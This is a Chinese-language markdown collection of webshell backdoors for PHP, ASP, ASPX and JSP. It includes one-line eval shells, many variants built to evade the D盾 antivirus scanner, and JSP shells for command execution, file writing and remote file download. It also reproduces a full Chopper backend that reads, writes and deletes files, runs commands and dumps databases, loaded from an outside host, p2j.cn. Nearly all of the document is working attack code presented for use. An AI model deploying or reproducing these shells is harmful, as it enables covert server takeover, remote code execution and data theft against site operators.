# webshell木马
#木马 #webshell

**webshell收集项目：**[tennc/webshell: This is a webshell open source project (github.com)](https://github.com/tennc/webshell)

**免杀webshell生成项目：**[pureqh/webshell: 免杀webshell生成工具 (github.com)](https://github.com/pureqh/webshell)

## 常用
```
php：<?php @eval($_POST['pass']);?>
asp：<%eval request ("pass")%>
aspx：<%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
jsp：<% if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());
%>
```
## php
**一句话木马原型：**
```php
<?php eval($_POST["a"]);?>
```
两个函数`eval`和`assert`,**eval是语言构造器而非函数，不能被可变函数调用。**

可用的php字符串操作：
```php
convert_uudecode() #解码一个 uuencode 编码的字符串。
convert_uuencode() #使用 uuencode 编码一个字符串。
ucwords() #函数把字符串中每个单词的首字符转换为大写。
strrev () #反转字符串
trim() #函数从字符串的两端删除空白字符和其他预定义字符。
substr_replace() #函数把字符串的一部分替换为另一个字符串
substr() #函数返回字符串的一部分。
strtr() #函数转换字符串中特定的字符。
strtoupper() #函数把字符串转换为大写。
strtolower() #函数把字符串转换为小写。
implode()  #将一个一维数组的值转化为字符串。
str_rot13() #函数对字符串执行 ROT13 编码。
```
**编码绕过：**
```php
<?php
// 使用 uuencode 编码一个字符串
// 编码器选择base64
$a=convert_uuencode("assert");
$b=convert_uudecode($a);
$b($_POST["a"]);
?>
```
**自定义函数绕过：**
```php
<?php
// 编码器选择base64
function change($a){
    $a($_POST["a"]);
}
change(assert);
?>
```
可用的回调函数：
```php
call_user_func_array()
call_user_func()
array_filter() 
array_walk()  
array_map()
registregister_shutdown_function()
register_tick_function()
filter_var() 
filter_var_array() 
uasort() 
uksort() 
array_reduce()
array_walk() 
array_walk_recursive()
```
**回调函数绕过：**
```php
<?php
// 编码器选择base64
forward_static_call_array(assert,array($_POST["a"]));
?>
```
**函数+回调绕过：**
```php
<?php
// 编码器选择base64
function change($a,$b){
    forward_static_call_array($a,$b);
}
change(assert,array($_POST["a"]));
?>
```
**类+回调绕过：**
```php
<?php
// 编码器选择base64
class change{
    var $a;
    var $b;
    function __construct($a,$b)
    {
        $this->a=$a;
        $this->b=$b;
    }
    function test(){
        forward_static_call_array($this->a,$this->b);
    }
}
$s1= new change(assert,array($_POST["a"]));
$s1->test();
?>
```
![](../../../attaches/Pasted%20image%2020220914105656.png)
实测D盾将其识别为稍低等级的可疑文件。

**特殊符号绕过：**
```php
<?php
// 编码器选择base64
$a = $_POST['a'];
$b = "\n";
eval($b.=$a);
?>
```
**数组绕过：**
```php
<?php
// 编码器选择base64
$a=strrev("tressa");
$b=[''=>$a($_POST["a"])];
?>
```
![](../../../attaches/Pasted%20image%2020220914110126.png)
**类绕过：**
```php
<?php
// 编码器选择base64
class change
{
  public $a = '';
  function __destruct(){
    assert("$this->a");
  }
}

$b = new change;
$b->a = $_POST["a"];
?>
```
**base64编码绕过：**
```php
<?php
// 编码器选择base64
$a = base64_decode("YXNzZXJ0");
$a($_POST["a"]);
?>
```
**create_function：**
```php
<?php
// 编码器选择base64
$fun = create_function('',$_POST['a']);
$fun();
?>
```
**call_user_func：**
```php
<?php
// 编码器选择base64
@call_user_func(assert,$_POST['a']);
?>
```
**preg_replace：**
/e参数可以将后面的参数作为代码执行。
```php
<?php 
@preg_replace("/abcde/e", $_POST['a'], "abcdefg");
?>

<?php @mb_ereg_replace('.*',$_POST['a'],'','ee');?>
<?php @mb_eregi_replace('.*',$_POST['a'],'','ee');?>

<?php @mbereg_replace('.*',$_POST['a'],'','ee');?>
<?php @mberegi_replace('.*',$_POST['a'],'','ee');?>
```
**file_put_contents：**
```php
<?php
$test='<?php $a=$_POST["a"];assert($a); ?>';
file_put_contents("core.php", $test);
?>
```
**parse_str：**
```php
<?php
$str="a=eval";
parse_str($str);
$a($_POST['a']);
?>
```
## asp
asp木马原型：
```asp
<%eval request ("pass")%>
```
加密asp：
```asp
asp一句话木马程序代码
<%eval request("a")%>

<%execute request("a")%>

<%execute(request("a"))%>

<%execute request("a")%><%'<% loop <%:%>

<%'<% loop <%:%><%execute request("a")%>

<%execute request("a")'<% loop <%:%>[code]

[code]<script language=vbs runat=server>eval(request("a"))</script>

%><%Eval(Request(chr(35)))%><%

<%eval request("a")%>

<%ExecuteGlobal request("a")%>

if Request("a")<> "" then ExecuteGlobal request("a") end if

//容错代码
程序代码
<%@LANGUAGE="JAVASCRIPT" CODEPAGE="65001"%>
<%
var lcx = {'名字' : Request.form('#'), '性别' : eval, '年龄' : '18', '昵称' : '请叫我一声老大'};
lcx.性别((lcx.名字)+'');
%>
```
aspx备用：
```aspx
程序代码
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
程序代码
<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
//Jscript的asp.net一句话
程序代码
<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])   ); }%>
//C#的asp.net一句话
程序代码
<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
//VB的asp.net一句话

```
## jsp
```jsp
JSP一句话
<%
if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());
%>

提交客户端
<form action="http://59.x.x.x:8080/scdc/bob.jsp?f=fuckjp.jsp" method="post">
<textarea name=t cols=120 rows=10 width=45>your code</textarea><BR><center><br>
<input type=submit value="提交">
</form>
```

写文件马：
```jsp
<% if(request.getParameter(“f”)!=null)(new  
java.io.FileOutputStream(application.getRealPath("/")+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());  
%>  
```
提交url为 [http://localhost/1.jsp?f=1.txt&;t=hello](http://localhost/1.jsp?f=1.txt&;t=hello)  

无回显执行系统命令：
```jsp
<%Runtime.getRuntime().exec(request.getParameter("i"));%>
```
请求：http://192.168.16.240:8080/Shell/cmd2.jsp?i=ls

**高级版：**
```jsp
<%@ page language="java" contentType="text/html; charset=GBK"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>一句话木马</title>
    </head>

    <body>
        <%
        if ("admin".equals(request.getParameter("pwd"))) {
            java.io.InputStream input = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
            int len = -1;
            byte[] bytes = new byte[4092];
            out.print("<pre>");
            while ((len = input.read(bytes)) != -1) {
                out.println(new String(bytes, "GBK"));
            }
            out.print("</pre>");
        }
    %>
    </body>

</html>
```
请求：http://127.0.0.1/shell.jsp?pwd=admin&cmd=calc

有回显带密码验证：
```jsp
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```
请求：http://192.168.16.240:8080/Shell/cmd2.jsp?pwd=023&i=ls

字符串编码并写入文件：
```jsp
<%new java.io.FileOutputStream(request.getParameter("f")).write(request.getParameter("c").getBytes());%>
```

请求：http://localhost:8080/Shell/file.jsp?f=/Users/yz/wwwroot/2.txt&c=1234

文件写入：
```jsp
<%
    // ISO-8859-1 输入
    new java.io.FileOutputStream(request.getParameter("file")).write(request.getParameter("content").getBytes());
    // UTF-8 输入
    new java.io.FileOutputStream(request.getParameter("file")).write(new String(request.getParameter("content").getBytes("ISO-8859-1"), "UTF-8").getBytes());
    // Web 目录写入
    new java.io.FileOutputStream(application.getRealPath("/") + "/" + request.getParameter("filename")).write(request.getParameter("content").getBytes());
    // 功能更加丰富的写入
    new java.io.RandomAccessFile(request.getParameter("file"),"rw").write(request.getParameter("content").getBytes());
%>
```
```
// ISO-8859-1 输入
请求：http://127.0.0.1/input.jsp?file=D:/test.txt&content=test
// UTF-8 输入
请求URL：http://127.0.0.1/input.jsp?file=D:/test.txt&content=测试内容
// Web 目录写入
请求：http://127.0.0.1/input.jsp?filename=test.txt&content=test
// 功能更加丰富的写入
请求：http://127.0.0.1/input.jsp?file=D:/test.txt&content=test
```

写入web目录：
```jsp
<%new java.io.FileOutputStream(application.getRealPath("/")+"/"+request.getParameter("f")).write(request.getParameter("c").getBytes());%>
http://localhost:8080/Shell/file.jsp?f=2.txt&c=1234
<%new java.io.RandomAccessFile(request.getParameter("f"),"rw").write(request.getParameter("c").getBytes()); %>
http://localhost:8080/Shell/file.jsp?f=/Users/yz/wwwroot/2.txt&c=1234
<%new java.io.RandomAccessFile(application.getRealPath("/")+"/"+request.getParameter("f"),"rw").write(request.getParameter("c").getBytes()); %>
http://localhost:8080/Shell/file.jsp?f=2.txt&c=1234
```
下载远程文件：
```jsp
<%
    java.io.InputStream in = new java.net.URL(request.getParameter("u")).openStream();
    byte[] b = new byte[1024];
    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
    int a = -1;
    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }
    new java.io.FileOutputStream(request.getParameter("f")).write(baos.toByteArray());
%>
```
请求：http://localhost:8080/Shell/download.jsp?f=/Users/yz/wwwroot/1.png&u=http://www.baidu.com/img/bdlogo.png

下载到web路径：
```jsp
<%
    java.io.InputStream in = new java.net.URL(request.getParameter("u")).openStream();
    byte[] b = new byte[1024];
    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
    int a = -1;
    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }
    new java.io.FileOutputStream(application.getRealPath("/")+"/"+ request.getParameter("f")).write(baos.toByteArray());
%>
```
请求：http://localhost:8080/Shell/download.jsp?f=1.png&u=http://www.baidu.com/img/bdlogo.png

蚁剑木马：

```jsp
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("ant");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```
密码passwd
```jspx
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:declaration>
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }
            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }
        public byte[] base64Decode(String str) throws Exception {
            Class base64;
            byte[] value = null;
            try {
                base64=Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
            } catch (Exception e) {
                try {
                    base64=Class.forName("java.util.Base64");
                    Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                    value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
                } catch (Exception ee) {}
            }
            return value;
        }
    </jsp:declaration>
    <jsp:scriptlet>
        String cls = request.getParameter("ant");
        if (cls != null) {
            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
        }
    </jsp:scriptlet>
</jsp:root>
```

反射调用外部jar：
```jsp
<%=Class.forName("Load",true,new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(request.getParameter("u"))})).getMethods()[0].invoke(null, new Object[]{request.getParameterMap()})%>
```
请求：[http://192.168.16.240:8080/Shell/reflect.jsp?u=http://p2j.cn/Cat.jar&023=A](http://192.168.16.240:8080/Shell/reflect.jsp?u=http://p2j.cn/Cat.jar&023=A)

菜刀连接：[http://192.168.16.240:8080/Shell/reflect.jsp?u=http://p2j.cn/Cat.jar，密码023](http://192.168.16.240:8080/Shell/reflect.jsp?u=http://p2j.cn/Cat.jar%EF%BC%8C%E5%AF%86%E7%A0%81023).

Load：
```java
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author yz
 */
public class Load {
    
    public static String load(Map<String,String[]> map){
        try {
            Map<String,String> request = new HashMap<String,String>();
            for (Entry<String, String[]> entrySet : map.entrySet()) {
                String key = entrySet.getKey();
                String value = entrySet.getValue()[0];
                request.put(key, value);
            }
            return new Chopper().doPost(request);
        } catch (IOException ex) {
            return ex.toString();
        }
    }
    
}
```
Chopper代码：
```java
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;

public class Chopper{

    public static String getPassword() throws IOException {
        return "023";
    }

    String cs = "UTF-8";

    String encoding(String s) throws Exception {
        return new String(s.getBytes("ISO-8859-1"), cs);
    }

    Connection getConnection(String s) throws Exception {
        String[] x = s.trim().split("\r\n");
        try {
            Class.forName(x[0].trim());
        } catch (ClassNotFoundException e) {
            boolean classNotFound = true;
            BufferedReader br = new BufferedReader(new InputStreamReader(this.getClass().getResourceAsStream("/map.txt")));
            String str = "";
            while ((str = br.readLine()) != null) {
                String[] arr = str.split("=");
                if (arr.length == 2 && arr[0].trim().equals(x[0].trim())) {
                    try {
                        URLClassLoader ucl = (URLClassLoader) ClassLoader.getSystemClassLoader();
                        Method m = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
                        m.setAccessible(true);
                        m.invoke(ucl, new Object[]{new URL(arr[1])});
                        Class.forName(arr[0].trim());
                        classNotFound = false;
                        break;
                    } catch (ClassNotFoundException ex) {
                        throw ex;
                    }
                }
            }
            if (classNotFound) {
                throw e;
            }
        }
        if (x[1].contains("jdbc:oracle")) {
            return DriverManager.getConnection(x[1].trim() + ":" + x[4],
                    x[2].equalsIgnoreCase("[/null]") ? "" : x[2],
                    x[3].equalsIgnoreCase("[/null]") ? "" : x[3]);
        } else {
            Connection c = DriverManager.getConnection(x[1].trim(),
                    x[2].equalsIgnoreCase("[/null]") ? "" : x[2],
                    x[3].equalsIgnoreCase("[/null]") ? "" : x[3]);
            if (x.length > 4) {
                c.setCatalog(x[4]);
            }
            return c;
        }
    }

    void listRoots(ByteArrayOutputStream out) throws Exception {
        File r[] = File.listRoots();
        for (File f : r) {
            out.write((f.getName()).getBytes(cs));
        }
    }

    void dir(String s, ByteArrayOutputStream out) throws Exception {
        File l[] = new File(s).listFiles();
        for (File f : l) {
            String mt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(f.lastModified()));
            String rw = f.canRead() ? "R" : "" + (f.canWrite() ? " W" : "");
            out.write((f.getName() + (f.isDirectory() ? "/" : "") + "\t" + mt + "\t" + f.length() + "\t" + rw + "\n").getBytes(cs));
        }
    }

    void deleteFiles(File f) throws Exception {
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (File fs : x) {
                deleteFiles(fs);
            }
        }
        f.delete();
    }

    byte[] readFile(String s) throws Exception {
        int n;
        byte[] b = new byte[1024];
        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(s));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while ((n = bis.read(b)) != -1) {
            bos.write(b, 0, n);
        }
        bis.close();
        return bos.toByteArray();
    }

    void upload(String s, String d) throws Exception {
        String h = "0123456789ABCDEF";
        File f = new File(s);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i < d.length(); i += 2) {
            os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));
        }
        os.close();
    }

    void filesMove(File sf, File df) throws Exception {
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File z[] = sf.listFiles();
            for (File z1 : z) {
                filesMove(new File(sf, z1.getName()), new File(df, z1.getName()));
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[1024];
            while ((n = is.read(b)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
    }

    void fileMove(File s, File d) throws Exception {
        s.renameTo(d);
    }

    void mkdir(File s) throws Exception {
        s.mkdir();
    }

    void setLastModified(File s, String t) throws Exception {
        s.setLastModified(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").parse(t).getTime());
    }

    void downloadRemoteFile(String s, String d) throws Exception {
        int n = 0;
        FileOutputStream os = new FileOutputStream(d);
        HttpURLConnection h = (HttpURLConnection) new URL(s).openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[1024];
        while ((n = is.read(b)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
    }

    void inputStreamToOutPutStream(InputStream is, ByteArrayOutputStream out) throws Exception {
        int i = -1;
        byte[] b = new byte[1024];
        while ((i = is.read(b)) != -1) {
            out.write(b, 0, i);
        }
    }

    void getCurrentDB(String s, ByteArrayOutputStream out) throws Exception {
        Connection c = getConnection(s);
        ResultSet r = s.contains("jdbc:oracle") ? c.getMetaData().getSchemas() : c.getMetaData().getCatalogs();
        while (r.next()) {
            out.write((r.getObject(1) + "\t").getBytes(cs));
        }
        r.close();
        c.close();
    }

    void getTableName(String s, ByteArrayOutputStream out) throws Exception {
        Connection c = getConnection(s);
        String[] x = s.trim().split("\r\n");
        ResultSet r = c.getMetaData().getTables(null, s.contains("jdbc:oracle") ? x.length > 5 ? x[5] : x[4] : null, "%", new String[]{"TABLE"});
        while (r.next()) {
            out.write((r.getObject("TABLE_NAME") + "\t").getBytes(cs));
        }
        r.close();
        c.close();
    }

    void getTableColumn(String s, ByteArrayOutputStream out) throws Exception {
        String[] x = s.trim().split("\r\n");
        Connection c = getConnection(s);
        ResultSet r = c.prepareStatement("select * from " + x[x.length - 1]).executeQuery();
        ResultSetMetaData d = r.getMetaData();
        for (int i = 1; i <= d.getColumnCount(); i++) {
            out.write((d.getColumnName(i) + " (" + d.getColumnTypeName(i) + ")\t").getBytes(cs));
        }
        r.close();
        c.close();
    }

    void executeQuery(String cs, String s, String q, ByteArrayOutputStream out, String p) throws Exception {
        Connection c = getConnection(s);
        Statement m = c.createStatement(1005, 1008);
        BufferedWriter bw = null;
        try {
            boolean f = q.contains("--f:");
            ResultSet r = m.executeQuery(f ? q.substring(0, q.indexOf("--f:")) : q);
            ResultSetMetaData d = r.getMetaData();
            int n = d.getColumnCount();
            for (int i = 1; i <= n; i++) {
                out.write((d.getColumnName(i) + "\t|\t").getBytes(cs));
            }
            out.write(("\r\n").getBytes(cs));
            if (f) {
                File file = new File(p);
                if (!q.contains("-to:")) {
                    file.mkdir();
                }
                bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.contains("-to:") ? p.trim() : p + q.substring(q.indexOf("--f:") + 4, q.length()).trim()), true), cs));
            }
            while (r.next()) {
                for (int i = 1; i <= n; i++) {
                    if (f) {
                        bw.write(r.getObject(i) + "" + "\t");
                        bw.flush();
                    } else {
                        out.write((r.getObject(i) + "" + "\t|\t").getBytes(cs));
                    }
                }
                if (bw != null) {
                    bw.newLine();
                }
                out.write(("\r\n").getBytes(cs));
            }
            r.close();
            if (bw != null) {
                bw.close();
            }
        } catch (Exception e) {
            out.write(("Result\t|\t\r\n").getBytes(cs));
            try {
                m.executeUpdate(q);
                out.write(("Execute Successfully!\t|\t\r\n").getBytes(cs));
            } catch (Exception ee) {
                out.write((ee.toString() + "\t|\t\r\n").getBytes(cs));
            }
        }
        m.close();
        c.close();
    }

    public String doPost(Map<String,String>request) throws IOException {
        cs = request.get("z0") != null ? request.get("z0") + "" : cs;
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try {
            char z = (char) request.get(getPassword()).getBytes()[0];
            String z1 = encoding(request.get("z1") + "");
            String z2 = encoding(request.get("z2") + "");
            out.write("->|".getBytes(cs));
            String s = new File("").getCanonicalPath();
            byte[] returnTrue = "1".getBytes(cs);
            switch (z) {
                case 'A':
                    out.write((s + "\t").getBytes(cs));
                    if (!s.substring(0, 1).equals("/")) {
                        listRoots(out);
                    }
                    break;
                case 'B':
                    dir(z1, out);
                    break;
                case 'C':
                    String l = "";
                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
                    while ((l = br.readLine()) != null) {
                        out.write((l + "\r\n").getBytes(cs));
                    }
                    br.close();
                    break;
                case 'D':
                    BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
                    bw.write(z2);
                    bw.flush();
                    bw.close();
                    out.write(returnTrue);
                    break;
                case 'E':
                    deleteFiles(new File(z1));
                    out.write("1".getBytes(cs));
                    break;
                case 'F':
                    out.write(readFile(z1));
                case 'G':
                    upload(z1, z2);
                    out.write(returnTrue);
                    break;
                case 'H':
                    filesMove(new File(z1), new File(z2));
                    out.write(returnTrue);
                    break;
                case 'I':
                    fileMove(new File(z1), new File(z2));
                    out.write(returnTrue);
                    break;
                case 'J':
                    mkdir(new File(z1));
                    out.write(returnTrue);
                    break;
                case 'K':
                    setLastModified(new File(z1), z2);
                    out.write(returnTrue);
                    break;
                case 'L':
                    downloadRemoteFile(z1, z2);
                    out.write(returnTrue);
                    break;
                case 'M':
                    String[] c = {z1.substring(2), z1.substring(0, 2), z2};
                    Process p = Runtime.getRuntime().exec(c);
                    inputStreamToOutPutStream(p.getInputStream(), out);
                    inputStreamToOutPutStream(p.getErrorStream(), out);
                    break;
                case 'N':
                    getCurrentDB(z1, out);
                    break;
                case 'O':
                    getTableName(z1, out);
                    break;
                case 'P':
                    getTableColumn(z1, out);
                    break;
                case 'Q':
                    executeQuery(cs, z1, z2, out, z2.contains("-to:") ? z2.substring(z2.indexOf("-to:") + 4, z2.length()) : s.replaceAll("\\\\", "/") + "images/");
                    break;
            }
        } catch (Exception e) {
            out.write(("ERROR" + ":// " + e.toString()).getBytes(cs));
        }
        out.write(("|<-").getBytes(cs));
        return new String(out.toByteArray());
    }

}
```
map.txt：
```
oracle.jdbc.driver.OracleDriver=http://p2j.cn/jdbc/classes12.jar  
com.mysql.jdbc.Driver=http://p2j.cn/jdbc/mysql-connector-java-5.1.14-bin.jar  
com.microsoft.jdbc.sqlserver.SQLServerDriver=http://p2j.cn/jdbc/sqlserver2000/msbase.jar
http://p2j.cn/jdbc/sqlserver2000/mssqlserver.jar,http://p2j.cn/jdbc/sqlserver2000/msutil.jar
com.microsoft.sqlserver.jdbc.SQLServerDriver=http://p2j.cn/jdbc/sqljdbc4.jar  
com.ibm.db2.jcc.DB2Driver=http://p2j.cn/jdbc/db2java.jar  
com.informix.jdbc.IfxDriver=http://p2j.cn/jdbc/ifxjdbc.jar  
com.sybase.jdbc3.jdbc.SybDriver=http://p2j.cn/jdbc/jconn3d.jar  
org.postgresql.Driver=http://p2j.cn/jdbc/postgresql-9.2-1003.jdbc4.jar  
com.ncr.teradata.TeraDriver=http://p2j.cn/jdbc/teradata-jdbc4-14.00.00.04.jar  
com.hxtt.sql.access.AccessDriver=http://p2j.cn/jdbc/Access_JDBC30.jar  
org.apache.derby.jdbc.ClientDriver=http://p2j.cn/jdbc/derby.jar  
org.hsqldb.jdbcDriver=http://p2j.cn/jdbc/hsqldb.jar  
net.sourceforge.jtds.jdbc.Driver=http://p2j.cn/jdbc/jtds-1.2.5.jar  
mongodb=http://p2j.cn/jdbc/mongo-java-driver-2.9.3.jar
```